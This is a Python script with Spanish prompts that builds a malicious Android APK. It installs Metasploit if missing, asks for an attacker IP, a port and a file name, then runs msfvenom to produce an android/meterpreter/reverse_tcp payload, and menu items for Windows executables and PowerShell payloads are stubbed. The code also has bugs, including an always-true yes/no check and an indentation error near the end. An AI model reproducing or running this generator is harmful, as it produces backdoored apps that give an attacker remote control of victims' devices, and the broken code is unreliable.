#Programa Creado Por NesAnTime
from tqdm import tqdm
import os
import subprocess
import platform
import time
import sys

def Limpiar():
    sistema = platform.system()
    if sistema == "Windows":
        os.system("cls")
    elif sistema == "Linux":
        subprocess.run(["clear"])
    else:
        print("Este Sistema No Posee Mas Soporte")

def lapzo():
    tiempo = 3
    time.sleep(tiempo)

def Barra(desc):
    lista_de_elementos = range(100)
    for elemento in tqdm(lista_de_elementos, desc):
        time.sleep(0.1)
    

def check_metasploit():
    try:
        subprocess.check_call(["which", "msfconsole"])
        subprocess.check_call(["which", "msfvenom"])
        return True
    except subprocess.CalledProcessError:
        return False
    
def check_tqdm():
    try:
        import tqdm
        return True
    except ImportError:
        return False
    
def instalar_metasploit():
    try:
        comando = "sudo apt install metasploit-framework"
        resultado = subprocess.run(comando, shell=True, check=True, capture_output=True, text=True)
        print("Metasploit se ha instalado correctamente.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"Error al instalar Metasploit: {e}")
        return False
    
def instalar_tqdm():
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'tqdm'])
        print("tqdm se ha instalado correctamente.")
    except subprocess.CalledProcessError as e:
        print(f"Error al instalar tqdm: {e}")
    except Exception as e:
        print(f"Se ha producido un error inesperado: {e}")
    


def Dependencias():
    print("Comprobando dependencias Instaladas")
    lapzo()

    print("Verificando La Herramienta Metasploit")
    check_metasploit()
    lapzo()

    print("Verificando la Dependencia MSFVenom")
    lapzo()
    
    print("Verificando la Libreria tqdm")
    if not check_tqdm():
        print("La Libreria de Python tqdm, no se encuentra instalada..")
        od = input("¿Desea Instalarla Ahora? Y/N ")
        if od == "N" or "n":
            print("Error. No se Puede Continuar Con La Ejecucion del Playload")
            print("Descarge las Dependencias Requeridas. Error 80004001")
            input("Presione Enter Para Continuar... ")
        else:
            print("Iniciando Descarga De la Libreria...")
            instalar_tqdm()
            if instalar_tqdm():
                Barra(desc="Verificando La Instalacion:")
                print("Se Puede Proceder Con La Ejecucion del Playload")
                input("Presione Enter Para Continuar... ")
            else:
                print("La instalación de Metasploit falló. Error 710048005")
    lapzo()
    
    if check_metasploit():
        print("msfvenom - Metasploit está instalado en el sistema.")
        input("\nPresione Enter Para Continuar.. ")
        executeandroid()
    else:
        print("msfvenom - Metasploit no está instalado en el sistema.")
        opd = input("¿Desea Instalarlo Ahora? Y/N ")
        if opd == "N" or "n":
            print("Error. No se Puede Continuar Con La Ejecucion del Playload")
            print("Descarge las Dependencias Requeridas. Error 80004001")
            input("Presione Enter Para Continuar... ")
        else:
            print("Iniciando Descarga De Dependencias...")
            instalar_metasploit()
            if instalar_metasploit():
                Barra(desc="Verificando La Instalacion:")
                print("\nAhora puedes utilizar Metasploit.")
                print("Se Puede Proceder Con La Ejecucion del Playload")
                input("Presione Enter Para Continuar... ")
                executeandroid()
            else:
                print("La instalación de Metasploit falló. Error 710048005")


def executeandroid():
    Limpiar()
    Barra(desc="Iniciando la Ejecucion: ")
    print("\nEjecucion del Payload Completada...")
    print("A Continuacion, Se Completara La Creacion De La Apk\n")
    ip = input("Proporcione Su Direccion IP: \n")
    lop = input("Su direccion IP:" + str(ip) + " ¿Es Correcta? (y/n): ")
    while lop == "n":
        ip = input("Proporcione Su Direccion IP Nuevamente: \n")
        lop = input("Su direccion IP:" + str(ip) + " ¿Es Correcta? (y/n): ")
    Limpiar()
    print(f"Direccion IP ({ip}) Establecida Correctamente...\n")

    port = int(input("Proporcione un Puerto de Escucha: "))
    print(f"El Puerto de Escucha (" + str(port) + ") Se ha Establecido Correctamente..\n")
    Limpiar()

    print("** Terminando La Creacion del APK ** ")
    name = input("Ingrese el Nombre del Archivo .Apk: ")
    print(f"Se Ha establecido El Nombre del Archivo ({name}.apk) Correctamente! ")
    Limpiar()
    Barra(desc="Creando Archivo .Apk")

    try:
        comando = "msfvenom -p android/meterpreter/reverse_tcp LHOST="+ ip + " LPORT="+ str(port) + " -o " + name +".apk"
        resultado = subprocess.run(comando, shell=True, check=True, capture_output=True, text=True)
        print("Se Ha Creado El Archivo .APK Correctamente\n")
        print("*** Informacion Y Detalles ***")
        print(f"Name:{name}.apk")
        print(f"IP: {ip}")
        print(f"PORT: {port}")
        input("\nPresione Enter Para Finalizar... ")
        Main()

        return True
    except subprocess.CalledProcessError as e:
        print(f"Error al Crear El Archivo :( {e}")
        input("\nPresione Enter Para Finalizar... ")
        Main()
        return False


def Main():
    Limpiar()
    print("\n")
    print("  ██████▓██   ██▓  ██████  ███▄    █ ▓█████   ██████")
    print("▒██    ▒ ▒██  ██▒▒██    ▒  ██ ▀█   █ ▓█   ▀ ▒██    ▒")
    print("░ ▓██▄    ▒██ ██░░ ▓██▄   ▓██  ▀█ ██▒▒███   ░ ▓██▄  ")
    print("  ▒   ██▒ ░ ▐██▓░  ▒   ██▒▓██▒  ▐▌██▒▒▓█  ▄   ▒   ██▒")
    print("▒██████▒▒ ░ ██▒▓░▒██████▒▒▒██░   ▓██░░▒████▒▒██████▒▒")
    print("▒ ▒▓▒ ▒ ░  ██▒▒▒ ▒ ▒▓▒ ▒ ░░ ▒░   ▒ ▒ ░░ ▒░ ░▒ ▒▓▒ ▒ ░")
    print("░ ░▒  ░ ░▓██ ░▒░ ░ ░▒  ░ ░░ ░░   ░ ▒░ ░ ░  ░░ ░▒  ░ ░")
    print("░  ░  ░  ▒ ▒ ░░  ░  ░  ░     ░   ░ ░    ░   ░  ░  ░  ")
    print("      ░  ░ ░           ░           ░    ░  ░      ░  ")
    print("         ░ ░                                         ")
    print("\nPyload Creado Por NesAnTime\n")

    print("--- Menu De Opciones ---")
    print("1. Crear Archivo (.Apk) (Version Rapida)")
    print("2. Crear Archivo (.Exe o .msi) (Beta)")
    print("3. Crear Comando PowerShell (Windows) (Beta)")
    print("4. Cerrar El Payload\n")

    opc = int(input("Ingrese La Opcion: "))
    while (opc < 1) or (opc > 4):
        print("Error. La Opcion No esta Disponible :(")
        opc = int(input("Ingrese Nuevamente La Opcion: "))
        
    if opc == 1:
        Limpiar()
        Dependencias()
    elif opc == 2:
        print("Hasta Ahora Es una Version Beta En Desarrollo (No Disponible)")
    elif opc == 3:
        print("Hasta Ahora Es una Version Beta En Desarrollo (No Disponible)")
    else:
        print("Programa Finalizado...")


print("Iniciando...")
    input("\nPresione Enter Para Continuar...")
Main()



